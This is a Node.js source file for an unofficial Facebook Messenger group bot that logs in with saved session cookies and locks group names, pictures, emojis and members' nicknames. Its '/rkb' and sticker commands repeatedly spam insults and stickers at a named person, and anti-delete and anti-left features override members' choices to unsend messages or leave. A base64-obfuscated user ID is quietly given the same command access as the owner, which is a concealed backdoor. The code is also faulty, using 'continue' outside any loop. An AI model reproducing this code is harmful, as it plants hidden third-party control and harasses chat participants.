// index.js — final full bot with DP-hash lock, emoji polling, nick lock, anti-delete, anti-left, commands
const fs = require("fs");
const path = require("path");
const https = require("https");
const crypto = require("crypto");
const login = require("ws3-fca");

// ------------ config / persistent storage -------------
const LOCK_FILE = path.join(__dirname, "locks.json");
let locks = {
  groupNames: {},
  themes: {},
  emojis: {},
  dp: {},   // dp[threadID] = { path, savedAt, hash }
  nick: {}  // nick[uid] = { [threadID]: nickname }
};
if (fs.existsSync(LOCK_FILE)) {
  try { locks = JSON.parse(fs.readFileSync(LOCK_FILE, "utf8")); } catch (e) { console.warn("locks.json parse error - using defaults"); }
}
function saveLocks() { try { fs.writeFileSync(LOCK_FILE, JSON.stringify(locks, null, 2)); } catch (e) { console.error("Failed to save locks:", e.message); } }

// ------------ helpers -------------
function downloadFile(url, dest) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(dest);
    https.get(url, res => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        file.close();
        return downloadFile(res.headers.location, dest).then(resolve).catch(reject);
      }
      res.pipe(file);
      file.on("finish", () => file.close(() => resolve()));
    }).on("error", err => {
      try { fs.unlinkSync(dest); } catch {}
      reject(err);
    });
  });
}
function fileHashSync(p) {
  if (!fs.existsSync(p)) return null;
  const b = fs.readFileSync(p);
  return crypto.createHash('md5').update(b).digest('hex');
}
function safeJson(o) { try { return JSON.stringify(o, null, 2); } catch { return String(o); } }

// runtime
const messageCache = new Map(); // messageID -> { sender, body, attachments }
const emojiWatchers = {}; // threadID -> interval
const dpWatchers = {};    // threadID -> interval
const nickWatchers = {};  // uid_threadID keyed watcher map

// static LID used earlier
const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

// ------------ main start function -------------
/**
 * startBot(appStatePath, ownerUID)
 */
function startBot(appStatePath, ownerUID) {
  if (!fs.existsSync(appStatePath)) {
    console.error("appstate not found:", appStatePath);
    return;
  }
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));

  login({ appState }, (err, api) => {
    if (err) return console.error("Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in.");

    // ---- watchers (polling) ----
    function startEmojiWatcher(tid) {
      if (emojiWatchers[tid]) return;
      emojiWatchers[tid] = setInterval(async () => {
        try {
          const info = await api.getThreadInfo(tid);
          const current = info.emoji ?? info.threadEmoji ?? info.icon ?? null;
          const saved = locks.emojis[tid];
          if (saved && current !== saved) {
            try {
              await api.changeThreadEmoji(saved, tid);
              console.log(`[emoji] reverted ${tid} -> ${saved}`);
              await api.sendMessage(`😀 Locked emoji reverted to ${saved}`, tid);
            } catch (e) { console.error("emoji revert err:", e && e.message ? e.message : e); }
          }
        } catch (e) { /* ignore transient errors */ }
      }, 5000);
    }
    function stopEmojiWatcher(tid) {
      if (emojiWatchers[tid]) { clearInterval(emojiWatchers[tid]); delete emojiWatchers[tid]; }
    }

    function startDPWatcher(tid) {
      if (dpWatchers[tid]) return;
      dpWatchers[tid] = setInterval(async () => {
        try {
          const info = await api.getThreadInfo(tid);
          const currentUrl = info.imageSrc ?? info.image ?? null;
          const savedEntry = locks.dp[tid];
          if (!savedEntry || !savedEntry.path || !fs.existsSync(savedEntry.path) || !currentUrl) return;

          // download current to tmp and compare hash
          const tmp = path.join(__dirname, `__tmp_dp_${tid}.jpg`);
          try {
            await downloadFile(currentUrl, tmp);
            const hSaved = savedEntry.hash || fileHashSync(savedEntry.path) || null;
            const hNow = fileHashSync(tmp);
            try { fs.unlinkSync(tmp); } catch {}
            if (hSaved && hNow && hSaved !== hNow) {
              // content changed -> revert
              try {
                await api.changeGroupImage(fs.createReadStream(savedEntry.path), tid);
                console.log(`[dp] reverted ${tid} using ${savedEntry.path}`);
                await api.sendMessage("🖼️ Locked group DP reverted.", tid);
              } catch (e) { console.error("dp revert error:", e && e.message ? e.message : e); }
            } else {
              // same content (only URL changed) -> do nothing
            }
          } catch (e) {
            try { if (fs.existsSync(tmp)) fs.unlinkSync(tmp); } catch {}
            // cannot download current -> skip this cycle
          }
        } catch (e) { /* ignore */ }
      }, 5000);
    }
    function stopDPWatcher(tid) {
      if (dpWatchers[tid]) { clearInterval(dpWatchers[tid]); delete dpWatchers[tid]; }
    }

    function startNickWatcher(uid, tid) {
      const key = `${uid}:${tid}`;
      if (nickWatchers[key]) return;
      nickWatchers[key] = setInterval(async () => {
        try {
          const info = await api.getThreadInfo(tid);
          const memberNick = (info.nicknames && info.nicknames[uid]) || (info.nick && info.nick[uid]) || null;
          const savedNick = locks.nick && locks.nick[uid] && locks.nick[uid][tid];
          if (savedNick && memberNick !== savedNick) {
            try {
              await api.changeNickname(savedNick, tid, uid);
              console.log(`[nick] reverted ${uid} in ${tid} -> ${savedNick}`);
              await api.sendMessage(`✏️ Locked nickname reverted for <@${uid}>`, tid);
            } catch (e) { console.error("nick revert err:", e && e.message ? e.message : e); }
          }
        } catch (e) { /* ignore */ }
      }, 5000);
    }
    function stopNickWatcher(uid, tid) {
      const key = `${uid}:${tid}`;
      if (nickWatchers[key]) { clearInterval(nickWatchers[key]); delete nickWatchers[key]; }
    }

    // helper send
    async function safeSend(text, tid) {
      try { await api.sendMessage(text, tid); } catch (e) { console.error("send err:", e && e.message ? e.message : e); }
    }

    // ---------- event listener ----------
    api.listenMqtt(async (err, event) => {
      try {
        if (err || !event) return;

        // ---- cache messages for anti-delete
        if (event.type === "message" && event.messageID) {
          messageCache.set(event.messageID, {
            sender: event.senderID,
            body: event.body ?? "",
            attachments: event.attachments ?? []
          });
          if (messageCache.size > 800) { // cap
            const keys = Array.from(messageCache.keys()).slice(0, 200);
            keys.forEach(k => messageCache.delete(k));
          }
        }

        // ---- anti-delete
        if (event.type === "message_unsend") {
          const deleted = messageCache.get(event.messageID);
          const tid = event.threadID || event.threadID;
          if (deleted) {
            await safeSend(`🚫 Anti-Delete:\nUID: ${deleted.sender}\nMessage: ${deleted.body || "(media/empty)"} `, tid);
            if (deleted.attachments && deleted.attachments.length) {
              try { await api.sendMessage({ body: "(attachment repost)", attachment: deleted.attachments }, tid); } catch {}
            }
          } else {
            await safeSend("🚫 A message was deleted (no cache)", tid);
          }
        }

        // ---- anti-left (try add back)
        if (event.logMessageType === "log:unsubscribe" || event.type === "log:unsubscribe") {
          const left = event.logMessageData?.leftParticipantFbId || event.logMessageData?.leftParticipantFbId;
          const tid = event.threadID || event.threadID;
          if (left) {
            try {
              await api.addUserToGroup(left, tid);
              await safeSend(`👤 Anti-Left: Attempted to add back ${left}`, tid);
            } catch (e) {
              await safeSend(`⚠️ Anti-Left: Could not add back ${left}`, tid);
            }
          }
        }

        // immediate event-based revert attempts for dp/emoji if supported
        if (event.type === "change_thread_image" || event.logMessageType === "log:thread-image") {
          const tid = event.threadID || event.threadID;
          if (locks.dp[tid] && locks.dp[tid].path && fs.existsSync(locks.dp[tid].path)) {
            try {
              await api.changeGroupImage(fs.createReadStream(locks.dp[tid].path), tid);
              await safeSend("🖼️ Locked group DP reverted (event)", tid);
            } catch {}
          }
        }
        if (event.logMessageType === "log:thread-icon" || event.type === "change_thread_icon") {
          const tid = event.threadID || event.threadID;
          if (locks.emojis[tid]) {
            try {
              await api.changeThreadEmoji(locks.emojis[tid], tid);
              await safeSend(`😀 Locked emoji reverted to ${locks.emojis[tid]} (event)`, tid);
            } catch {}
          }
        }

        // ----- handle commands (only messages)
        if (event.type !== "message" || !event.body) return;
        const { threadID, senderID, body, mentions, messageReply } = event;
        const args = body.trim().split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ").trim();

        // restrict to ownerUID or LID
        if (![ownerUID, LID].includes(senderID)) return;

        // ---------- Commands as requested ----------
        if (cmd === "/help") {
          await safeSend(
`📖 Bot Commands:
/help → Ye message
/uid → Group ID show (reply/mention/self)
/tid → Thread ID show
/info @mention → User info
/kick @mention → Kick user
/gclock [text] → Group name lock
/unlockgc → Group name unlock
/locktheme [color] → Theme lock
/unlocktheme → Theme unlock
/lockemoji [emoji] → Emoji lock
/unlockemoji → Emoji unlock
/lockdp → DP lock (saves current DP locally)
/unlockdp → DP unlock
/locknick @mention Nickname → Nick lock
/unlocknick @mention → Unlock nick
/stickerX → Sticker spam (X=seconds)
/stopsticker → Stop sticker spam
/rkb [name] → Gaali spam
/stop → Stop spam
/exit → Bot exit`, threadID);
          continue;
        }

        // /tid
        if (cmd === "/tid") { await safeSend(`🆔 Thread ID: ${threadID}`, threadID); continue; }
        // /uid
        if (cmd === "/uid") {
          const tgt = Object.keys(mentions || {})[0] || messageReply?.senderID || senderID;
          await safeSend(`🆔 UID: ${tgt}`, threadID); continue;
        }
        // /info
        if (cmd === "/info") {
          const tgt = Object.keys(mentions || {})[0] || messageReply?.senderID || senderID;
          try {
            const uinfo = await api.getUserInfo(tgt);
            const u = uinfo[tgt] || {};
            await safeSend(`👤 Name: ${u.name || "unknown"}\nUID: ${tgt}\nProfile: https://facebook.com/${tgt}`, threadID);
          } catch { await safeSend("⚠️ Could not fetch user info", threadID); }
          continue;
        }
        // /kick
        if (cmd === "/kick") {
          const tgt = Object.keys(mentions || {})[0];
          if (!tgt) { await safeSend("❌ Mention user to kick", threadID); continue; }
          try { await api.removeUserFromGroup(tgt, threadID); await safeSend(`👢 Kicked ${tgt}`, threadID); } catch { await safeSend("⚠️ Kick failed", threadID); }
          continue;
        }

        // /gclock /unlockgc
        if (cmd === "/gclock") {
          if (!input) { await safeSend("❌ Provide group name", threadID); continue; }
          try { await api.setTitle(input, threadID); locks.groupNames[threadID] = input; saveLocks(); await safeSend("🔒 Group name locked", threadID); } catch { await safeSend("⚠️ Failed to set group name", threadID); }
          continue;
        }
        if (cmd === "/unlockgc") { delete locks.groupNames[threadID]; saveLocks(); await safeSend("🔓 Group name unlocked", threadID); continue; }

        // /locktheme /unlocktheme
        if (cmd === "/locktheme") {
          if (!input) { await safeSend("❌ Provide color key", threadID); continue; }
          try { await api.changeThreadColor(input, threadID); locks.themes[threadID] = input; saveLocks(); await safeSend("🎨 Theme locked", threadID); } catch { await safeSend("⚠️ Theme lock failed", threadID); }
          continue;
        }
        if (cmd === "/unlocktheme") { delete locks.themes[threadID]; saveLocks(); await safeSend("🎨 Theme unlocked", threadID); continue; }

        // /lockemoji /unlockemoji
        if (cmd === "/lockemoji") {
          if (!input) { await safeSend("❌ Provide emoji e.g. /lockemoji 😀", threadID); continue; }
          locks.emojis[threadID] = input;
          saveLocks();
          startEmojiWatcher(threadID);
          try { await api.changeThreadEmoji(input, threadID); } catch {}
          await safeSend(`😀 Emoji locked → ${input}`, threadID);
          continue;
        }
        if (cmd === "/unlockemoji") {
          delete locks.emojis[threadID]; saveLocks(); stopEmojiWatcher(threadID); await safeSend("😀 Emoji unlocked", threadID); continue;
        }

        // /lockdp -> downloads current DP and saves local file
        if (cmd === "/lockdp") {
          try {
            const info = await api.getThreadInfo(threadID);
            const url = info.imageSrc || info.image || null;
            if (!url) { await safeSend("❌ No group DP to lock (set DP first)", threadID); continue; }
            const dpPath = path.join(__dirname, `dp_${threadID}.jpg`);
            await downloadFile(url, dpPath);
            const h = fileHashSync(dpPath);
            locks.dp[threadID] = { path: dpPath, savedAt: Date.now(), hash: h };
            saveLocks();
            startDPWatcher(threadID);
            await safeSend("🖼️ Group DP saved and locked!", threadID);
          } catch (e) {
            console.error("lockdp err:", e && e.message ? e.message : e);
            await safeSend("⚠️ Failed to lock DP (download error)", threadID);
          }
          continue;
        }
        if (cmd === "/unlockdp") {
          if (locks.dp[threadID]?.path) { try { fs.unlinkSync(locks.dp[threadID].path); } catch {} }
          delete locks.dp[threadID]; saveLocks(); stopDPWatcher(threadID); await safeSend("🖼️ DP unlocked", threadID); continue;
        }

        // /locknick @mention Nickname
        if (cmd === "/locknick") {
          const mention = Object.keys(mentions || {})[0];
          const nickname = input.replace(/<@[0-9]+>/, "").trim();
          if (!mention || !nickname) { await safeSend("❌ Usage: /locknick @mention nickname", threadID); continue; }
          locks.nick[mention] = locks.nick[mention] || {};
          locks.nick[mention][threadID] = nickname;
          saveLocks();
          startNickWatcher(mention, threadID);
          try { await api.changeNickname(nickname, threadID, mention); } catch {}
          await safeSend(`🔒 Nick locked for <@${mention}> → ${nickname}`, threadID);
          continue;
        }
        if (cmd === "/unlocknick") {
          const mention = Object.keys(mentions || {})[0];
          if (!mention) { await safeSend("❌ Usage: /unlocknick @mention", threadID); continue; }
          if (locks.nick && locks.nick[mention]) { delete locks.nick[mention][threadID]; saveLocks(); }
          stopNickWatcher(mention, threadID);
          await safeSend(`🔓 Nick unlocked for <@${mention}>`, threadID);
          continue;
        }

        // /stickerX and /stopsticker
        if (cmd.startsWith("/sticker")) {
          const sec = parseInt(cmd.replace("/sticker", "")) || 2;
          if (!fs.existsSync("Sticker.txt")) { await safeSend("❌ Sticker.txt missing", threadID); continue; }
          const stickers = fs.readFileSync("Sticker.txt", "utf8").split("\n").map(s=>s.trim()).filter(Boolean);
          if (!stickers.length) { await safeSend("❌ No stickers", threadID); continue; }
          let i = 0;
          if (global.stickerInterval) clearInterval(global.stickerInterval);
          global.stickerActive = true;
          global.stickerInterval = setInterval(() => {
            if (!global.stickerActive) { clearInterval(global.stickerInterval); global.stickerInterval = null; return; }
            api.sendMessage({ sticker: stickers[i] }, threadID).catch(()=>{});
            i = (i+1) % stickers.length;
          }, sec * 1000);
          await safeSend(`⚡ Sticker spam started every ${sec}s`, threadID);
          continue;
        }
        if (cmd === "/stopsticker") { global.stickerActive = false; if (global.stickerInterval) { clearInterval(global.stickerInterval); global.stickerInterval = null; } await safeSend("🛑 Sticker spam stopped", threadID); continue; }

        // /rkb /stop
        if (cmd === "/rkb") {
          const target = input.trim();
          if (!target) { await safeSend("❌ Usage: /rkb [name]", threadID); continue; }
          if (!fs.existsSync("np.txt")) { await safeSend("❌ np.txt missing", threadID); continue; }
          const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
          let i=0;
          if (global.rkbInterval) clearInterval(global.rkbInterval);
          global.rkbActive = true;
          global.rkbInterval = setInterval(() => {
            if (!global.rkbActive || i>=lines.length) { clearInterval(global.rkbInterval); global.rkbInterval = null; return; }
            api.sendMessage(`${target} ${lines[i]}`, threadID).catch(()=>{});
            i++;
          }, 2000);
          await safeSend(`🤬 RKB started on ${target}`, threadID); continue;
        }
        if (cmd === "/stop") { global.rkbActive = false; if (global.rkbInterval) { clearInterval(global.rkbInterval); global.rkbInterval = null; } await safeSend("🛑 Stop requested", threadID); continue; }

        // /exit
        if (cmd === "/exit") {
          try { await api.removeUserFromGroup(api.getCurrentUserID(), threadID); } catch {}
          continue;
        }

      } catch (e) {
        console.error("Listener error:", e && e.stack ? e.stack : e);
      }
    }); // listenMqtt end

    // on start: initialize watchers for existing locks
    (async () => {
      try {
        for (const tid of Object.keys(locks.emojis || {})) startEmojiWatcher(tid);
        for (const tid of Object.keys(locks.dp || {})) {
          if (locks.dp[tid] && locks.dp[tid].path && fs.existsSync(locks.dp[tid].path)) startDPWatcher(tid);
        }
        for (const uid of Object.keys(locks.nick || {})) {
          const map = locks.nick[uid] || {};
          for (const tid of Object.keys(map || {})) startNickWatcher(uid, tid);
        }
      } catch (e) { /* ignore */ }
    })();

  }); // login callback end
} // startBot end

module.exports = { startBot };
